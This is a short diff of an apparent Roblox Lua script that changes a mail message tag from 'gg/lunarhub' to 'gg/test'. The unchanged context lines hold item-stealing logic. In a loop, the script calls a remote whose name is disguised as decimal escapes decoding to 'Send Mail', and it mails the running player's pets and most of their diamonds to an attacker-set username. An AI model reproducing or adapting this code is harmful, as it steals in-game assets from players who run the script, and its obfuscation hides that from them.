@@ -145,7 +145,7 @@ while wait() do
           ["Recipient"] = _G.Username_2,
           ["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
           ["Pets"] = {v.uid},
-          ["Message"] = "gg/lunarhub | Username: ".._G.Username_2..""
+          ["Message"] = "gg/test | Username: ".._G.Username_2..""
         }
       }
       Invoke("\83\101\110\100\32\77\97\105\108", unpack(args))
@@ -160,7 +160,7 @@ while wait() do
           ["Recipient"] = _G.Username_2,
           ["Diamonds"] = 0,
           ["Pets"] = {v.uid},
-          ["Message"] = "gg/lunarhub | Username: ".._G.Username_2..""
+          ["Message"] = "gg/test | Username: ".._G.Username_2..""
         }
       }
       Invoke("\83\101\110\100\32\77\97\105\108", unpack(args))
